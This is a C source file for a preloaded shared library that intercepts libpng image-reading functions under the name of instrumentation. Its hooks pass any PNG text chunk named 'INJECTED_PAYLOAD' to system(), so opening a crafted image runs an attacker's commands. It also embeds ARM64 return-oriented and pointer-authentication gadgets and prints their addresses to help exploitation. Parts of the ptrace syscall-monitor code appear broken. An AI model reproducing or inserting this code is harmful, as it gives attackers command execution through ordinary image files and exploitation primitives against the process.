#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <png.h>
#include <pthread.h>
//ptrace
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>


// Original function pointers
static png_structp (*real_png_create_read_struct)(png_const_charp user_png_ver, png_voidp error_ptr, png_error_ptr error_fn, png_error_ptr warn_fn) = NULL;
static void (*real_png_read_info)(png_structp png_ptr, png_infop info_ptr) = NULL;
static void (*real_png_read_image)(png_structp png_ptr, png_bytepp image) = NULL;
static void (*real_png_read_end)(png_structp png_ptr, png_infop info_ptr) = NULL;

// Global payload buffer for injected payloads
uint64_t global_injected_payload[512] __attribute__((aligned(16)));
char injected_command[1024];

// Instrumentation gadgets for enhanced exploitation
void injected_gadget_pop_x0_x1_ret() {
    asm volatile(
        "ldp x0, x1, [sp], #16\n\t"
        "ret"
    );
}

void injected_gadget_ldr_x0_x1_br_x0() {
    asm volatile(
        "ldr x0, [x1]\n\t"
        "br x0"
    );
}

void injected_gadget_vop_ldr_str_q0_ret() {
    asm volatile(
        "ldr q0, [x1]\n\t"
        "str q0, [x0]\n\t"
        "ret"
    );
}

// Additional PAC-aware gadgets
void injected_gadget_pacia_x30() {
    asm volatile("pacia x30, sp");
}

void injected_gadget_autia_x30() {
    asm volatile("autia x30, sp");
}

void injected_gadget_ldraa_x0_x1() {
    asm volatile("ldraa x0, [x1]");
}

// More VOP gadgets
void injected_gadget_vop_ldr_d0_x1() {
    asm volatile(
        "ldr d0, [x1]\n\t"
        "ret"
    );
}

void injected_gadget_vop_str_d0_x0() {
    asm volatile(
        "str d0, [x0]\n\t"
        "ret"
    );
}

// Payload execution function
void execute_injected_payload() {
    if (injected_command[0] != '\0') {
        printf("INJECTED PAYLOAD EXECUTION: %s\n", injected_command);
        fflush(stdout);
        system(injected_command);
    }
}

// Hook png_create_read_struct to inject our instrumentation
png_structp png_create_read_struct(png_const_charp user_png_ver, png_voidp error_ptr, png_error_ptr error_fn, png_error_ptr warn_fn) {
    if (!real_png_create_read_struct) {
        real_png_create_read_struct = dlsym(RTLD_NEXT, "png_create_read_struct");
    }

    void *result = real_png_create_read_struct(user_png_ver, error_ptr, error_fn, warn_fn);

    // Inject our gadgets into the process
    printf("INSTRUMENTATION: Injected gadgets into %s (PID: %d)\n", getenv("_") ? getenv("_") : "unknown", getpid());
    printf("INJECTED_GADGET pop_x0_x1_ret: %p\n", injected_gadget_pop_x0_x1_ret);
    printf("INJECTED_GADGET ldr_x0_x1_br_x0: %p\n", injected_gadget_ldr_x0_x1_br_x0);
    printf("INJECTED_GADGET vop_ldr_str_q0: %p\n", injected_gadget_vop_ldr_str_q0_ret);
    printf("INJECTED_GADGET pacia_x30: %p\n", injected_gadget_pacia_x30);
    printf("INJECTED_GADGET autia_x30: %p\n", injected_gadget_autia_x30);
    printf("INJECTED_GADGET ldraa_x0_x1: %p\n", injected_gadget_ldraa_x0_x1);
    printf("INJECTED_GADGET vop_ldr_d0_x1: %p\n", injected_gadget_vop_ldr_d0_x1);
    printf("INJECTED_GADGET vop_str_d0_x0: %p\n", injected_gadget_vop_str_d0_x0);
    printf("INJECTED_PAYLOAD_BUFFER: %p\n", global_injected_payload);
    fflush(stdout);

    return result;
}

// Hook png_read_info to check for payload chunks
void png_read_info(png_structp png_ptr, png_infop info_ptr) {
    if (!real_png_read_info) {
        real_png_read_info = dlsym(RTLD_NEXT, "png_read_info");
    }

    real_png_read_info(png_ptr, info_ptr);

    // Check for injected payload in text chunks
    png_textp text_ptr;
    int num_text;
    if (png_get_text(png_ptr, info_ptr, &text_ptr, &num_text)) {
        for (int i = 0; i < num_text; i++) {
            if (strcmp(text_ptr[i].key, "INJECTED_PAYLOAD") == 0) {
                strncpy(injected_command, text_ptr[i].text, sizeof(injected_command) - 1);
                // Execute payload immediately when found
                execute_injected_payload();
            }
        }
    }
}

// Hook png_read_image to trigger payload execution on overflow conditions
void png_read_image(png_structp png_ptr, png_bytepp image) {
    if (!real_png_read_image) {
        real_png_read_image = dlsym(RTLD_NEXT, "png_read_image");
    }

    real_png_read_image(png_ptr, image);

    // Check for overflow conditions and execute payload
    png_infop info_ptr = png_get_io_ptr(png_ptr);
    if (info_ptr) {
        png_uint_32 width = png_get_image_width(png_ptr, info_ptr);
        png_uint_32 height = png_get_image_height(png_ptr, info_ptr);

        // Trigger on suspiciously large images (potential overflow)
        if (width > 100000 || height > 100000) {
            printf("INSTRUMENTATION: Large image detected, executing injected payload\n");
            fflush(stdout);
            execute_injected_payload();
        }
    }
}

// Hook png_read_end to finalize instrumentation
void png_read_end(png_structp png_ptr, png_infop info_ptr) {
    if (!real_png_read_end) {
        real_png_read_end = dlsym(RTLD_NEXT, "png_read_end");
    }

    real_png_read_end(png_ptr, info_ptr);

    // Final payload execution check
    if (injected_command[0] != '\0') {
        printf("INSTRUMENTATION: Final payload execution\n");
        fflush(stdout);
        execute_injected_payload();
    }
}
void *syscall_monitor_thread(void *arg) ;

// Constructor to initialize instrumentation
__attribute__((constructor)) void init_instrumentation() {
    printf("INSTRUMENTATION: Shared object loaded into process %d\n", getpid());
    printf("INSTRUMENTATION: Available gadgets:\n");
    printf("  - injected_gadget_pop_x0_x1_ret\n");
    printf("  - injected_gadget_ldr_x0_x1_br_x0\n");
    printf("  - injected_gadget_vop_ldr_str_q0_ret\n");
    printf("  - injected_gadget_pacia_x30\n");
    printf("  - injected_gadget_autia_x30\n");
    printf("  - injected_gadget_ldraa_x0_x1\n");
    printf("  - injected_gadget_vop_ldr_d0_x1\n");
    printf("  - injected_gadget_vop_str_d0_x0\n");
    printf("  - execute_injected_payload function\n"); 
    //define syscall_monitor_thread and execute_injected_payload functions to monitor syscalls and execute payloads based on conditions (e.g., execve with certain arguments) 
    
    printf("INSTRUMENTATION: Running monitor thread for syscall detection\n");
    pthread_t monitor_thread;
    if (pthread_create(&monitor_thread, NULL, syscall_monitor_thread, NULL) != 0) {
        fprintf(stderr, "Failed to create syscall monitor thread\n");
    }
    // Detach thread to run independently
    pthread_detach(monitor_thread);

    fflush(stdout);
}

// Destructor for cleanup
__attribute__((destructor)) void cleanup_instrumentation() {
    printf("INSTRUMENTATION: Shared object unloaded\n");
    // Clean up any resources used by the instrumentation
    //close threads, free memory, etc.

    fflush(stdout);
}


//create a thread that monitors the syscalls made by the process and triggers payload execution on specific conditions (e.g., execve with certain arguments) 
// This is a simplified example and may require additional permissions (e.g., ptrace) to work properly 
void *syscall_monitor_thread(void *arg) {
 
    long ret = 0;
    
    ret = ptrace(PTRACE_ATTACH, getpid(), NULL, NULL);
    if (ret != 0) {
        fprintf(stderr, "Failed to attach to process for syscall monitoring\n");
        return NULL;
    }
    printf("INSTRUMENTATION: Successfully attached to process for syscall monitoring\n");
    fflush(stdout); 
    
    ptrace(PTRACE_SETOPTIONS, getpid(), NULL, PTRACE_O_TRACESYSGOOD|PTRACE_O_TRACEEXIT); // Set option to distinguish syscall stops
        
    ptrace(PTRACE_SYSCALL, getpid(), NULL, NULL); // Start monitoring syscalls  

    // Monitor syscalls in a polling loop
    while (1) {
        int status;
        wait(&status);
        if (WIFEXITED(status)) {
            break; // Process exited
        }
        if (WIFSTOPPED(status) && WSTOPSIG(status) & 0x80) { // Syscall entry
            struct user_regs_struct regs;
            ptrace(PTRACE_GETREGSET, getpid(), NULL, &regs);
            // Check for execve syscall (number may vary based on architecture)
            //regs struct user_regs_struct may need to be adjusted based on architecture (e.g., x86_64 vs AArch64) 
            #ifdef __aarch64__

            //regs struct user_regs_struct for AArch64 has doesn't have orig_x0  

             if (regs.regs[8] == 221) { // execve syscall number for AArch64
                char *filename = (char *)ptrace(PTRACE_PEEKDATA, getpid(), regs.regs[0], NULL);
                if (filename && strstr(filename, "malicious_command") != NULL) {
                    printf("INSTRUMENTATION: Detected execve with malicious command, executing payload\n");
                    fflush(stdout);
                    execute_injected_payload(); 
                }
                else if (filename && strstr(filename, "benign_command") != NULL) {
                    printf("INSTRUMENTATION: Detected execve with benign command, skipping payload execution\n");
                    fflush(stdout);
                }
                else {
                    printf("INSTRUMENTATION: Detected execve with unknown command: %s\n", filename ? filename : "NULL");
                    fflush(stdout);
                }

             }
            #else   
             if (regs.orig_rax == 59) { // execve syscall number for x86_64
                char *filename = (char *)ptrace(PTRACE_PEEKDATA, getpid(), regs.rdi, NULL);
                if (filename && strstr(filename, "malicious_command") != NULL) {
                    printf("INSTRUMENTATION: Detected execve with malicious command, executing payload\n");
                    fflush(stdout);
                    execute_injected_payload(); 
                }
                else if (filename && strstr(filename, "benign_command") != NULL) {
                    printf("INSTRUMENTATION: Detected execve with benign command, skipping payload execution\n");
                    fflush(stdout);
                }
                else {
                    printf("INSTRUMENTATION: Detected execve with unknown command: %s\n", filename ? filename : "NULL");
                    fflush(stdout);
                }
            }
             #endif
        }
        ptrace(PTRACE_SYSCALL, getpid(), NULL, NULL); // Continue to next syscall
    }
    ptrace(PTRACE_DETACH, getpid(), NULL, NULL);

    return NULL;
} 